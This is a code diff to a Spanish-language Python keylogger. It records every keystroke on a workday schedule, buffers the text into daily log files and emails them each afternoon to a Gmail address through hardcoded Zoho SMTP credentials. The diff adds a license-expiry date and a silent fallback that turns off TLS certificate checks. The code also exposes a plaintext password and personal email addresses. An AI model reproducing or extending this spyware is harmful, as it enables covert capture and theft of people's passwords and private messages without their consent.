@@ -22,18 +22,30 @@ START = time(hour=6, minute=0)
 END = time(hour=20, minute=0)
 HORA_ENVIO = time(hour=15, minute=0)  # 3 PM
 
+# FECHA DE EXPIRACIÓN
+FECHA_EXPIRACION = datetime(2025, 12, 31, 23, 59, 59)
+
 # Configuración SMTP
 SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.zoho.com")
 SMTP_PORT = int(os.environ.get("SMTP_PORT", 465))
 SMTP_USER = os.environ.get("SMTP_USER", "onecore_mail@zohomail.com")
-SMTP_PASS = os.environ.get("SMTP_PASS", "Onecore2025**")
-# MAIL_TO = os.environ.get("MAIL_TO", "yarokasas@gmail.com")
-MAIL_TO = os.environ.get("MAIL_TO", "rmolina15@gmail.com")
+SMTP_PASS = os.environ.get("SMTP_PASS", "Ana152913**")
+MAIL_TO = os.environ.get("MAIL_TO", "yarokasas@gmail.com")
 
 # ---------- Variables globales ----------
 nombre_equipo = ""
 envio_realizado_hoy = False
 keyboard_listener = None
+buffer_texto = []  # Buffer para acumular texto
+ultima_tecla_tiempo = None
+
+# ---------- Funciones de Verificación ----------
+def verificar_expiracion():
+    """Verifica si el programa ha expirado."""
+    ahora = datetime.now()
+    if ahora > FECHA_EXPIRACION:
+        return True
+    return False
 
 # ---------- Funciones de Configuración ----------
 def obtener_nombre_equipo():
@@ -61,6 +73,7 @@ def guardar_config():
     config = {
         "nombre_equipo": nombre_equipo,
         "fecha_instalacion": datetime.now().isoformat(),
+        "fecha_expiracion": FECHA_EXPIRACION.isoformat(),
         "politica_aceptada": True
     }
     try:
@@ -82,7 +95,7 @@ def obtener_log_del_dia():
     fecha = datetime.now().strftime('%Y-%m-%d')
     if not os.path.exists(LOGS_DIR):
         os.makedirs(LOGS_DIR)
-    return os.path.join(LOGS_DIR, f"log_{fecha}.dat")
+    return os.path.join(LOGS_DIR, f"log_{fecha}.txt")
 
 def dentro_de_horario():
     """Verifica si estamos dentro del horario de captura."""
@@ -95,24 +108,54 @@ def asegurar_log_existe():
     if not os.path.exists(log_file):
         try:
             with open(log_file, "w", encoding="utf-8") as f:
-                f.write(f"=== Equipo: {nombre_equipo} ===\n")
-                f.write(f"=== Fecha: {datetime.now().strftime('%Y-%m-%d')} ===\n")
-                f.write(f"=== Inicio: {datetime.now().isoformat()} ===\n\n")
+                f.write(f"═══════════════════════════════════════════════════════════\n")
+                f.write(f"  REGISTRO DE ACTIVIDAD - {nombre_equipo}\n")
+                f.write(f"  Fecha: {datetime.now().strftime('%Y-%m-%d')}\n")
+                f.write(f"  Horario: {START.strftime('%H:%M')} - {END.strftime('%H:%M')}\n")
+                f.write(f"═══════════════════════════════════════════════════════════\n\n")
         except:
             pass
 
+def escribir_buffer():
+    """Escribe el buffer acumulado al log."""
+    global buffer_texto
+    
+    if not buffer_texto:
+        return
+    
+    try:
+        log_file = obtener_log_del_dia()
+        texto = ''.join(buffer_texto)
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        
+        with open(log_file, "a", encoding="utf-8") as f:
+            f.write(f"[{timestamp}] {texto}\n")
+        
+        buffer_texto = []
+    except:
+        pass
+
 def log_key(text):
-    """Añade una entrada al archivo de log del día."""
+    """Añade texto al buffer."""
+    global buffer_texto, ultima_tecla_tiempo
+    
     if not dentro_de_horario():
         return False
     
     try:
-        log_file = obtener_log_del_dia()
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        linea = f"[{timestamp}] {text}\n"
+        ahora = time_module.time()
         
-        with open(log_file, "a", encoding="utf-8") as f:
-            f.write(linea)
+        # Si han pasado más de 2 segundos, escribir buffer y empezar nuevo párrafo
+        if ultima_tecla_tiempo and (ahora - ultima_tecla_tiempo) > 2:
+            escribir_buffer()
+        
+        buffer_texto.append(text)
+        ultima_tecla_tiempo = ahora
+        
+        # Si el buffer es muy grande (más de 500 caracteres), escribirlo
+        if len(buffer_texto) > 500:
+            escribir_buffer()
+        
         return True
     except:
         return False
@@ -121,10 +164,40 @@ def on_press(key):
     """Callback para cuando se presiona una tecla."""
     try:
         if hasattr(key, 'char') and key.char:
+            # Tecla normal (letras, números, símbolos)
             log_key(key.char)
         else:
+            # Teclas especiales
             key_name = str(key).replace("Key.", "")
-            log_key(f"[{key_name}]")
+            
+            # Mapeo de teclas especiales a formato legible
+            teclas_especiales = {
+                'space': ' ',
+                'enter': '\n',
+                'tab': '\t',
+                'backspace': '[←]',
+                'delete': '[DEL]',
+                'shift': '',
+                'shift_r': '',
+                'ctrl_l': '',
+                'ctrl_r': '',
+                'alt_l': '',
+                'alt_r': '',
+                'caps_lock': '[CAPS]',
+                'esc': '[ESC]',
+                'up': '[↑]',
+                'down': '[↓]',
+                'left': '[←]',
+                'right': '[→]',
+            }
+            
+            if key_name.lower() in teclas_especiales:
+                texto = teclas_especiales[key_name.lower()]
+                if texto:  # Solo registrar si tiene valor
+                    log_key(texto)
+            else:
+                # Otras teclas especiales
+                log_key(f'[{key_name}]')
     except:
         pass
 
@@ -152,23 +225,46 @@ def enviar_mail_con_adjuntos(subject: str, body: str, attachments: list) -> tupl
             except Exception as e:
                 return False, f"Error adjuntando: {e}"
 
-        if SMTP_PORT == 465:
-            context = ssl.create_default_context()
-            with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
-                server.login(SMTP_USER, SMTP_PASS)
-                server.send_message(msg)
-        else:
-            with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
-                server.starttls(context=ssl.create_default_context())
-                server.login(SMTP_USER, SMTP_PASS)
-                server.send_message(msg)
-        return True, "Enviado"
+        # Intentar con verificación SSL normal
+        try:
+            if SMTP_PORT == 465:
+                context = ssl.create_default_context()
+                with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
+                    server.login(SMTP_USER, SMTP_PASS)
+                    server.send_message(msg)
+            else:
+                with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+                    server.starttls(context=ssl.create_default_context())
+                    server.login(SMTP_USER, SMTP_PASS)
+                    server.send_message(msg)
+            return True, "Enviado"
+        except ssl.SSLError:
+            # Si falla por SSL, reintentar sin verificar certificado
+            if SMTP_PORT == 465:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
+                    server.login(SMTP_USER, SMTP_PASS)
+                    server.send_message(msg)
+            else:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+                    server.starttls(context=context)
+                    server.login(SMTP_USER, SMTP_PASS)
+                    server.send_message(msg)
+            return True, "Enviado (SSL sin verificar)"
     except Exception as e:
         return False, str(e)
 
 def enviar_log_programado():
     """Envía el log del día automáticamente."""
     try:
+        # Escribir buffer pendiente antes de enviar
+        escribir_buffer()
+        
         log_file = obtener_log_del_dia()
         
         # Verificar que existe y tiene contenido
@@ -180,11 +276,14 @@ def enviar_log_programado():
             return False, "Log vacío"
         
         fecha = datetime.now().strftime('%Y-%m-%d')
+        dias_restantes = (FECHA_EXPIRACION - datetime.now()).days
+        
         subject = f"[Keylog] {nombre_equipo} - {fecha}"
         body = f"Registro diario del equipo: {nombre_equipo}\n"
         body += f"Fecha: {fecha}\n"
         body += f"Horario: {START.strftime('%H:%M')} - {END.strftime('%H:%M')}\n"
-        body += f"Tamaño: {size} bytes"
+        body += f"Tamaño: {size} bytes\n"
+        body += f"\n⚠️ Licencia expira en {dias_restantes} días ({FECHA_EXPIRACION.strftime('%Y-%m-%d')})"
         
         success, msg = enviar_mail_con_adjuntos(subject, body, [log_file])
         return success, msg
@@ -199,10 +298,9 @@ def limpiar_logs_antiguos():
         
         ahora = datetime.now()
         for filename in os.listdir(LOGS_DIR):
-            if filename.startswith("log_") and filename.endswith(".dat"):
+            if filename.startswith("log_") and filename.endswith(".txt"):
                 filepath = os.path.join(LOGS_DIR, filename)
-                # Obtener fecha del archivo
-                fecha_str = filename.replace("log_", "").replace(".dat", "")
+                fecha_str = filename.replace("log_", "").replace(".txt", "")
                 try:
                     fecha_archivo = datetime.strptime(fecha_str, '%Y-%m-%d')
                     dias_diff = (ahora - fecha_archivo).days
@@ -219,6 +317,13 @@ def verificar_hora_envio():
     
     while True:
         try:
+            # Verificar expiración cada ciclo
+            if verificar_expiracion():
+                # Escribir buffer pendiente
+                escribir_buffer()
+                # Programa expirado, detener
+                return
+            
             ahora = datetime.now()
             hora_actual = ahora.time()
             
@@ -227,7 +332,7 @@ def verificar_hora_envio():
                 envio_realizado_hoy = False
                 limpiar_logs_antiguos()
             
-            # Verificar si es la hora de envío (con margen de 1 minuto)
+            # Verificar si es la hora de envío
             minuto_envio = HORA_ENVIO.hour * 60 + HORA_ENVIO.minute
             minuto_actual = hora_actual.hour * 60 + hora_actual.minute
             
@@ -235,8 +340,7 @@ def verificar_hora_envio():
                 success, msg = enviar_log_programado()
                 if success:
                     envio_realizado_hoy = True
-                    # Registrar envío exitoso
-                    log_key(f"[SISTEMA: Correo enviado a las {ahora.strftime('%H:%M')}]")
+                    log_key(f"\n[SISTEMA: Correo enviado a las {ahora.strftime('%H:%M')}]\n")
             
             # Esperar 60 segundos
             time_module.sleep(60)
@@ -249,6 +353,11 @@ def iniciar_servicio():
     global keyboard_listener
     
     try:
+        # Verificar expiración antes de iniciar
+        if verificar_expiracion():
+            # Programa expirado, no iniciar
+            return
+        
         # Inicializar configuración
         inicializar_config()
         asegurar_log_existe()
@@ -261,13 +370,23 @@ def iniciar_servicio():
         thread_envio = threading.Thread(target=verificar_hora_envio, daemon=True)
         thread_envio.start()
         
+        # Thread para escribir buffer periódicamente
+        def escribir_buffer_periodico():
+            while not verificar_expiracion():
+                time_module.sleep(5)  # Cada 5 segundos
+                escribir_buffer()
+        
+        thread_buffer = threading.Thread(target=escribir_buffer_periodico, daemon=True)
+        thread_buffer.start()
+        
         # Mantener el programa corriendo
         keyboard_listener.join()
         
     except Exception as e:
         # Si hay error, intentar nuevamente después de 30 segundos
-        time_module.sleep(30)
-        iniciar_servicio()
+        if not verificar_expiracion():
+            time_module.sleep(30)
+            iniciar_servicio()
 
 if __name__ == "__main__":
     iniciar_servicio()
